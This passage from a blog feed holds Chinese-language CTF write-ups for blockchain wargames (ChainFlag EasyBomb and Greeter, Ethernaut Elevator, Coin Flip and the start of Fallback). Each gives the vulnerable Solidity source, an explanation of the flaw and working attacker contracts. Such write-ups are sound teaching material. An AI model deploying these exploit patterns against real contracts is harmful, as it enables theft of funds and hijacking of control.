punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    launcher <span class="token operator">=</span> <span class="token function">Launcher</span><span class="token punctuation">(</span>launcher_address<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">&lt;</span> launcher<span class="token punctuation">.</span><span class="token function">deadline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    hasExplode <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">_</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个的修饰器需要满足合约调用函数所在的区块数低于设置的值，测试分析这个 launcher.deadline() 一般设置要不创建时大一定的值，所以只要在一定时间内就没有什么影响，如果创建环境时间过长那就没有办法过这个验证限制，只能通过题目的选项二重新构建环境。</p><p>通过以上分析，我们研究了如何通过两个修饰器，下面我梳理一下总体的攻击思路和流程：</p><p>（1）构建一个攻击合约，攻击载荷放在合约的 constructor 函数中，构建一个攻击用 Launcher 合约，将setdeadline(uint256）函数实现为修改 power_state 所在 storage 的值。</p><p>（2）通过攻击合约调用目标合约 EasyBomb 的 setCountDownTimer 函数，通过填充数据通过修饰器的校验，将全局变量 launcher_address 修改为上一步构建的攻击用 Launcher 合约的地址。</p><p>（3）再次通过攻击合约调用目标合约 EasyBomb 的 setCountDownTimer 函数，触发我们构建的攻击用 Launcher 合约的 setdeadline(uint256）函数，实现修改power_state的值。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Launcher</span><span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">EasyBomb</span><span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">Launcherhack</span><span class="token punctuation">{</span>    <span class="token builtin">bool</span> <span class="token keyword">private</span> hasExplode<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">private</span> launcher_address<span class="token punctuation">;</span>    <span class="token builtin">bytes32</span> <span class="token keyword">private</span> password<span class="token punctuation">;</span>    <span class="token builtin">bool</span> <span class="token keyword">public</span> power_state<span class="token punctuation">;</span>    <span class="token builtin">bytes4</span> <span class="token keyword">constant</span> launcher_start_function_hash <span class="token operator">=</span> <span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"setdeadline(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Launcher launcher<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setdeadline</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _deadline<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        power_state <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">hackeasyboom</span><span class="token punctuation">{</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        EasyBomb easyBomb <span class="token operator">=</span> <span class="token function">EasyBomb</span><span class="token punctuation">(</span><span class="token number">0x5ac11A4ED7A810D0B0683ca70D3dF500ce969f8A</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Launcher target <span class="token operator">=</span> <span class="token function">Launcher</span><span class="token punctuation">(</span><span class="token number">0x6a9bE26DbcfcB597Aef8144fdE7495848de32c75</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// target.address+00 +password 0x6a9bE26DbcfcB597Aef8144fdE7495848de32c75</span>         <span class="token builtin">address</span><span class="token punctuation">(</span>easyBomb<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"setCountDownTimer(uint256)"</span><span class="token punctuation">,</span>         <span class="token number">0x00000000000000000000006a9bE26DbcfcB597Aef8144fdE7495848de32c7500</span><span class="token punctuation">,</span>          <span class="token number">0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">address</span><span class="token punctuation">(</span>easyBomb<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"setCountDownTimer(uint256)"</span><span class="token punctuation">,</span>        <span class="token number">0x00000000000000000000006a9bE26DbcfcB597Aef8144fdE7495848de32c7500</span><span class="token punctuation">,</span>         <span class="token number">0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ChainFlag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Elevator</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-elevator/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-elevator/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Elevator"><a href="#Ethernaut-Elevator" class="headerlink" title="Ethernaut - Elevator"></a>Ethernaut - Elevator</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>达到顶部</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Building</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">Elevator</span> <span class="token punctuation">{</span>  <span class="token builtin">bool</span> <span class="token keyword">public</span> top<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> floor<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">goTo</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _floor<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    Building building <span class="token operator">=</span> <span class="token function">Building</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>_floor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      floor <span class="token operator">=</span> _floor<span class="token punctuation">;</span>      top <span class="token operator">=</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>floor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解过程"><a href="#题解过程" class="headerlink" title="题解过程"></a>题解过程</h2><p>根据题目可知需要让 top 变量为 true 即可</p><p>而且提供了一个接口，实现接口中的 isLastFloor 方法修改 top 的值即可，只不过第一次为 false 第二次为 true</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: UNLICENSE</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.7</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Elevator</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">goTo</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _floor<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">Hacker</span> <span class="token punctuation">{</span>  <span class="token builtin">bool</span> <span class="token keyword">public</span> top<span class="token punctuation">;</span>  Elevator <span class="token keyword">public</span> targetContract<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    targetContract  <span class="token operator">=</span> <span class="token function">Elevator</span><span class="token punctuation">(</span><span class="token number">0x174C3f35eEC6dac9A925d048A0beEfeDB3dDf222</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>top<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    top <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>    targetContract<span class="token punctuation">.</span><span class="token function">goTo</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChainFlag - Greeter</title>
      <link href="/2023/01/21/catchtheflag/blockchain/chainflag/chainflag-greeter/"/>
      <url>/2023/01/21/catchtheflag/blockchain/chainflag/chainflag-greeter/</url>
      
        <content type="html"><![CDATA[<h1 id="ChainFlag-Greeter"><a href="#ChainFlag-Greeter" class="headerlink" title="ChainFlag - Greeter"></a>ChainFlag - Greeter</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>复现地址：<a href="https://chainflag.org/challenges#Greeter-30">https://chainflag.org/challenges#Greeter-30</a></p><p><img src="/../../../../pic/Pasted%20image%2020221105185705.png"></p><h2 id="0x02-知识点"><a href="#0x02-知识点" class="headerlink" title="0x02 知识点"></a>0x02 知识点</h2><p>只是签到用的，熟悉一下流程</p><p>整体解题思路：首先需要生成一个账户，然后你需要往这个账户转一点测试币以用于题目合约的部署，触发指定事件或者改变某个变量的状态后再 nc 靶机，他会检查题目合约是否触发了相应的事件（会让你再次输入触发事件的交易hash，服务端会去检查log）或者题目中相应变量的状态是否被更改，如果通过check则会发送flag。</p><h2 id="0x03-题解"><a href="#0x03-题解" class="headerlink" title="0x03 题解"></a>0x03 题解</h2><p>先使用 nc 链接靶机</p><p>创建一个部署题目的合约账户</p><p><img src="/../../../../pic/Pasted%20image%2020221105185918.png"></p><p>然后往给的地址中打入 0.001 测试币用于题目合约的部署</p><p><img src="/../../../../pic/Pasted%20image%2020221105190203.png"></p><p>等待处理完成之后，再次 nc 靶机，使用 2 验证交易并部署合约</p><p><img src="/../../../../pic/Pasted%20image%2020221105190242.png"></p><p>部署完成后给出了合约地址</p><p>读取下合约源码</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.7</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Greeter</span> <span class="token punctuation">{</span>    <span class="token builtin">string</span> greeting<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _greeting<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        greeting <span class="token operator">=</span> _greeting<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">greet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> greeting<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">setGreeting</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _greeting<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        greeting <span class="token operator">=</span> _greeting<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">isSolved</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token builtin">string</span> <span class="token keyword">memory</span> expected <span class="token operator">=</span> <span class="token string">"HelloChainFlag"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>expected<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>greeting<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>放入到 remix 中</p><p><img src="/../../../../pic/Pasted%20image%2020221105190421.png"></p><p>将题目给的合约地址填入到 At Address 中</p><p>在 isSolved 中审计得只要 greeting 变量的值为 HelloChainFlag 即可验证通过</p><p>使用 setGreeting 设置 greeting 为目标值</p><p><img src="/../../../../pic/Pasted%20image%2020221105190620.png"></p><p>设置时会发出交易请求，同意即可</p><p>通过之后，使用 isSolved 验证</p><p><img src="/../../../../pic/Pasted%20image%2020221105190716.png"></p><p>可见结果为真，然后 nc 靶机使用 3 读取 flag 即可</p><p><img src="/../../../../pic/Pasted%20image%2020221105190806.png"></p>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ChainFlag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Coin Flip</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-coin-flip/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-coin-flip/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Coin-Flip"><a href="#Ethernaut-Coin-Flip" class="headerlink" title="Ethernaut - Coin Flip"></a>Ethernaut - Coin Flip</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>你需要通过你的超能力来连续猜对十次。</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">{</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> lastHash<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue <span class="token operator">/</span> FACTOR<span class="token punctuation">;</span>    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">{</span>      consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>主要功能都在 <code>flip()</code> 方法中</p><p>先分析一下该方法都干了什么</p><p>block.number 可以用来获取当前交易对应的 block 编号，这里对其进行 -1 操作即获取到上一个 block 的编号，而blockhash(id) 可以获取对应 id 的 block 的 hash 值，对应形式类似0x0ac2bf40a6d661df20bbe1e61c73c0c247215f172053b9fc8af4bff15b94085b 这样，然后 uint256 将其转换为 16 进制对应的数值。其中给的 factor 就是$2^{256}/2$，所以每次做完除法的结果有一半几率是 0，一半是 1。</p><ul><li>本题考察点在于，上述这种通过block.blockhash(block.number - 1)获取负一高度的区块hash来生成随机数的方式是极易被攻击利用的。</li><li>原理是在区块链中，一个区块包含多个交易，我们可以先运行一下上述除法计算的过程获取结果究竟是0还是1，然后再发送对应的结果过去，区块链中块和快之前的间隔大概有10秒，手动去做会有问题，而且不能保证我们计算的合约是否和题目运算调用在同一个block上，因此需要写一个攻击合约完成调用。我们在攻击合约中调用题目中的合约，可以保证两个交易一定被打包在同一个区块上，因此它们获取的block.number.sub(1)是一样的，攻击合约代码如下:</li></ul><p>即先布置一个合约计算当前交易进行上述计算后的结果发送过去，大概率会在同一个区块中运行，如此即可实现</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">Hacker</span> <span class="token punctuation">{</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> lastHash<span class="token punctuation">;</span>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token builtin">address</span> _targetAddress<span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token punctuation">{</span>        CoinFlip c <span class="token operator">=</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span>_targetAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue <span class="token operator">/</span> FACTOR<span class="token punctuation">;</span>    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">flip</span><span class="token punctuation">(</span>side<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行十次 exploit 后即可</p>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Fallback</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-fallback/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-fallback/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Fallback"><a href="#Ethernaut-Fallback" class="headerlink" title="Ethernaut - Fallback"></a>Ethernaut - Fallback</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>获得这个合约的所有权</li><li>把他的余额减到0</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Fallback</span> <span class="token punctuation">{</span>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> contributions<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">modifier</span> onlyOwner <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>            msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span>            <span class="token string">"caller is not the owner"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">contribute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&lt;</span> <span class="token number">0.001</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>    contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;</span> contributions<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">getContribution</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>    <span class="token keyword">payable</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> contributions<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span 